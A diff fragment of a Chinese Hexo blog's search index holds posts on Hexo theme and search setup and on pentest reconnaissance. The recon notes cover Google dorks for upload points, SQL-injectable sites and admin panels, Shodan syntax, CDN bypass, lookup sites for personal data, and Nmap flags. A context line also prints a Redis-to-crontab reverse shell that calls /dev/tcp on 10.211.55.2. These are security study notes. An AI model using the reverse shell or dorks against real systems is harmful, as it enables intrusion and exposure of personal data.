-<li>配置hexo全局配置文件（请将生成的索引文件放在网站根目录或修改主题js文件的path值）<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  <span class="built_in">limit</span>: 10000</span><br></pre></td></tr></table></figure>
-以上代码直接复制粘贴到全局配置文件中</li>
-<li>新建一个页面，命名为search。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page search</span><br></pre></td></tr></table></figure></li>
-<li>编辑刚新建的页面，将页面的类型设置为search<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>: <span class="string">&quot;search&quot;</span></span><br></pre></td></tr></table></figure></li>
-<li>在主题配置文件启用本地搜索（此配置文件在themes文件夹下）<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#本地搜索,请将索引文件放在网站根目录</span></span><br><span class="line">local_search:</span><br><span class="line">    <span class="comment">#是否启用</span></span><br><span class="line">    <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
-<li>最后部署到GitHub<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean//清除缓存</span><br><span class="line">hexo g//生成静态文件</span><br><span class="line">hexo s//启动服务器</span><br><span class="line">hexo d//部署，用于将网站部署到服务器上</span><br></pre></td></tr></table></figure></li>
-</ul>
-]]></content>
+<h2 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h2><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2>]]></content>
   </entry>
   <entry>
     <title>网络安全之认证技术</title>
@@ -286,6 +214,96 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 分 时 日 月 星期 要运行的命令</span><br></pre></td></tr></table></figure>
 <h3 id="nc命令教程"><a href="#nc命令教程" class="headerlink" title="nc命令教程"></a>nc命令教程</h3><ul>
 <li>nc被誉为网络安全界的瑞士军刀，一个简单而有用的工具，通过使用TCP或UDP协议的网络数据连接去读写数据<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs/</span><br><span class="line">config set dbfilename root</span><br><span class="line">set x &quot;\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.211.55.2/2333 0&gt;&amp;1\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>hexo修改主题</title>
+    <url>/posts/38893.html</url>
+    <content><![CDATA[<ul>
+<li>默认主题千篇一律，要想有自己的东西，就要和别人不一样，所以搭建好自己的博客，当然要按照自己的喜好来布置主题啦</li>
+</ul>
+<hr>
+<h2 id="下载主题"><a href="#下载主题" class="headerlink" title="下载主题"></a>下载主题</h2><ul>
+<li>找到主题的下载链接,例如：<a href="https://github.com/Fechin/hexo-theme-diaspora.git">https://github.com/Fechin/hexo-theme-diaspora.git</a> themes&#x2F;diaspora，然后在gitbash中输入<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/Fechin/hexo-theme-diaspora.git themes/diaspora</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="启用主题"><a href="#启用主题" class="headerlink" title="启用主题"></a>启用主题</h2><ul>
+<li>修改Hexo配置文件_config.yml主题设置为diaspora<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">theme:diaspora//注意，在这里的主题名要与themes文件夹中的主题文件名一致</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="更新主题"><a href="#更新主题" class="headerlink" title="更新主题"></a>更新主题</h2><ul>
+<li>注意：在更新主题时备份_config.yml配置文件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> themes/diaspora</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="创建一个分类页面"><a href="#创建一个分类页面" class="headerlink" title="创建一个分类页面"></a>创建一个分类页面</h2><ul>
+<li>新建一个页面，命名为categories。命令如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure></li>
+<li>编辑刚新建的页面，将页面的类型设置为categories<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>: <span class="string">&quot;categories&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="创建标签页"><a href="#创建标签页" class="headerlink" title="创建标签页"></a>创建标签页</h2><ul>
+<li>新建一个页面，命名为tags。命令如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure></li>
+<li>编辑刚新建的页面，将页面设置为tags<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>: <span class="string">&quot;tags&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="创建搜索页"><a href="#创建搜索页" class="headerlink" title="创建搜索页"></a>创建搜索页</h2><ul>
+<li>需要安装hexo的搜索插件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure></li>
+<li>安装完成后输入以下命令查看安装情况<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm <span class="built_in">ls</span> --depth 0//一般不需要，因为正常情况不会出现安装失败</span><br></pre></td></tr></table></figure></li>
+<li>配置hexo全局配置文件（请将生成的索引文件放在网站根目录或修改主题js文件的path值）<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  <span class="built_in">limit</span>: 10000</span><br></pre></td></tr></table></figure>
+以上代码直接复制粘贴到全局配置文件中</li>
+<li>新建一个页面，命名为search。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page search</span><br></pre></td></tr></table></figure></li>
+<li>编辑刚新建的页面，将页面的类型设置为search<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>: <span class="string">&quot;search&quot;</span></span><br></pre></td></tr></table></figure></li>
+<li>在主题配置文件启用本地搜索（此配置文件在themes文件夹下）<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#本地搜索,请将索引文件放在网站根目录</span></span><br><span class="line">local_search:</span><br><span class="line">    <span class="comment">#是否启用</span></span><br><span class="line">    <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+<li>最后部署到GitHub<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean//清除缓存</span><br><span class="line">hexo g//生成静态文件</span><br><span class="line">hexo s//启动服务器</span><br><span class="line">hexo d//部署，用于将网站部署到服务器上</span><br></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>网络安全学习之信息收集</title>
+    <url>/posts/45922.html</url>
+    <content><![CDATA[<h3 id="渗透的本质就是信息收集"><a href="#渗透的本质就是信息收集" class="headerlink" title="渗透的本质就是信息收集"></a>渗透的本质就是信息收集</h3><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
+<li>信息收集是渗透测试的第一阶段，利用传统的搜索引擎，物联网引擎或直接使用本地工具对目标进行操作系统探测、端口扫描、Web目录扫描、Web指纹识别等，收集的信息越多渗透测试的成功率越高。“渗透的本质就是信息收集”</li>
+<li>分类：信息收集分为主动和被动<br>主动：直接访问、扫描网站这种将流量流经网站的行为<br>被动：利用第三方暴露在外，主要是互联网的信息进行收集</li>
+</ul>
+<h2 id="Google-Hack"><a href="#Google-Hack" class="headerlink" title="Google Hack"></a>Google Hack</h2><ul>
+<li>“+”强制包含某个关键字符进行查询<br>“-”查询的时候忽略某个字符<br>“*”匹配任意字符进行查询<br>“site”指定域名进行查询<br>“intext”正文中存在关键词的网页<br>“intitle”标题中存在关键词的网页<br>“inurl”URL中存在关键词的网页<br>“filetype”搜索指定文件类型</li>
+<li>查找文件上传点<br>inurl:admin&#x2F;upfile.asp<br>inurl:admin&#x2F;upload.asp<br>inurl:RichWidgets&#x2F;Popup_Upload.aspx  </li>
+<li>查找目录遍历站点<br>intitle：”index of”  </li>
+<li>寻找存在注入的PHP站点<br>inurl:”.php?id&#x3D;” “You have an error in your SQL syntax”</li>
+<li>寻找网站后台<br>intitle:后台登陆<br>inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms<br>inrtl:houtai.php|houtai.asp<br>intext:管理|后台|登录|用户名|密码|系统|账号<br><a href="https://www.exploit-db.com/google-hacking-database">https:www.exploit-db.com/google-hacking-database</a></li>
+</ul>
+<h2 id="物联网搜索引擎"><a href="#物联网搜索引擎" class="headerlink" title="物联网搜索引擎"></a>物联网搜索引擎</h2><ul>
+<li>Shodan.io<br>指定语法：<br>net:搜索指定ip地址或子网，c段<br>hostname:搜索指定的域名或服务器<br>port:搜索开放指定端口的设备<br>org:搜索指定公司或组织的设备<br>product：搜索运行指定产品或软件操系统的设备<br>version：指定软件的版本<br>isp：搜索指定isp供应商的设备<br>country：搜索指定国家的设备<br>city：搜索指定城市的设备</li>
+<li>fofa.so</li>
+</ul>
+<h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><ul>
+<li>&lt;phpinfo.me&gt;</li>
+</ul>
+<h2 id="C段与旁站"><a href="#C段与旁站" class="headerlink" title="C段与旁站"></a>C段与旁站</h2><ul>
+<li>C段<br>192.168.1.1&#x2F;24<br>192.168.1.1-192.168.1.255<br>B段<br>172.1.1.1&#x2F;16<br>172.1.1.1-172.1.1.255<br>A段<br>10.1.1.1-10.255.255.255<br>一般渗透测试对C段锦兴扫描，内网中会对B段进行探测扫描<br>必应，爱站，Fofa(获取到域名的IP地址后，可以反查域名)<br>内网：HTTPScan</li>
+</ul>
+<h2 id="服务器信息查询"><a href="#服务器信息查询" class="headerlink" title="服务器信息查询"></a>服务器信息查询</h2><ul>
+<li>CDN，将源站的内容发布到接近用户的网络边缘，用户可以就近获取数据，不仅降低了网络的拥塞情况、提高请求的响应速度，也能够减少源站的负载压力  </li>
+<li>ping命令<br>直接ping查询地址信息：ping.xxx.com可能得到其真实IP  </li>
+<li>nslookup查询<br>域名解析结果为多个ip，多半使用了CDN，是不真实的ip  </li>
+<li>超级ping<br>爱站超级ping  </li>
+<li>解析历史记录查询<br>查询ip与域名绑定历史记录，可能会发现使用CDN之前的目标ip  </li>
+<li>子域名绕过<br>很多网站的主站的访问大，主站挂CDN，分站不一定，结合之前的子域名爆破来进行收集  </li>
+<li>利用站点功能主动发起请求<br>一些网站提供注册服务，可能服务器本身自带sendmail可以直接发送邮件，通过邮件发送往往也能得到到服务器IP  </li>
+<li>利用网站漏洞<br>如果目标站点存在漏洞，如phpinfo敏感信息泄露，Struts2、网页源代码泄露、svn信息泄露、Github信息泄露<br>若存在Web泄露，服务器主动与我们发起请求连接，我们也能获取目标站点真实IP，例如xss等  </li>
+<li>国外访问</li>
+</ul>
+<h2 id="社工信息收集"><a href="#社工信息收集" class="headerlink" title="社工信息收集"></a>社工信息收集</h2><ul>
+<li>whois查询<br>whois.bugscaner.com<br>whois.aizhan.com<br>whois.chinaz.com  </li>
+<li>注册网站查询<br><a href="http://www.reg007.com/">www.reg007.com</a><br>inurl:t.me社工库<br>密码泄露查询：haveibeenpwned.com<br>国家职业资格证查询<br>身份证查询：http&#x2F;&#x2F;w<a href="http://www.2cha.com/">www.2cha.com</a><br>经纬度查询：http:&#x2F;<a href="http://www.gpsspg.com/maps.htm">www.gpsspg.com/maps.htm</a><br>微信搜索：http:&#x2F;weixin.sougou.com<br>Github信息收集</li>
+</ul>
+<h2 id="Nmap与Masscan"><a href="#Nmap与Masscan" class="headerlink" title="Nmap与Masscan"></a>Nmap与Masscan</h2><ul>
+<li>Nmap：网络映射器，一个开源端口扫描器，可以扫描大型网络也可以扫描单个主机<br>端口扫描是指人为发送一组端口扫描信息试图以了解某台计算机的弱点并了解其提供的计算机网络服务类型。  </li>
+<li>端口状态：<br>open对外开放<br>close对外关闭<br>Fitered无法判断被防火墙设备拦截过滤<br>Unfitered未被过滤，使用ACK扫描才可能出现这种情况<br>open\Fitered不能确定开放还是被过滤<br>close\Fitered不能确定关闭还是被过滤  </li>
+<li>主机发现：<br>-sP:ping扫描<br>-P0&#x2F;Pn:无ping扫描<br>-Ps：TCP SYN Ping扫描<br>-PA：TCP ACK ping扫描<br>-PU：UDP Ping扫描<br>-PE&#x2F;PP&#x2F;PM:ICMP Ping Types扫描<br>-PR:ARP Ping扫描<br>-sL：列表扫描<br>-6：扫描IPv6地址<br>–traceroute：路由跟踪<br>-PY：SCTP INIT Ping扫描  </li>
+<li>指纹探测<br>-sV：版本探测<br>-A：更加详细直观的扫描<br>–version-intensity：设置扫描强度1~9默认为7<br>–version-light：轻量级扫描，默认值为2<br>–version-all：重量级扫描，强度为9<br>-O：启动操作系统扫描  </li>
+<li>时间模板<br>-T0：非常慢，用于IDS躲避<br>-T1：缓慢的扫描，用于IDS躲避<br>-T2：降低了扫描速度，以使用更少的带宽和目标主机资源<br>-T3：默认模式，根据目标的反应自动调整时间<br>-T4：假设用户具有可靠的网络从而加速扫描<br>-T5：急速扫描，为了获得速度而牺牲准确性  </li>
+<li>TCP SYN扫描：<br>较常用的扫描方式，被称为半开放扫描，速度快，较隐蔽</li>
+</ul>
+<h2 id="提取指纹信息"><a href="#提取指纹信息" class="headerlink" title="提取指纹信息"></a>提取指纹信息</h2><ul>
+<li>返回包直接提取指纹信息  </li>
+<li>网站源码指纹提取指纹信息  </li>
+<li>指定文件的MD5值校验</li>
 </ul>
 ]]></content>
   </entry>
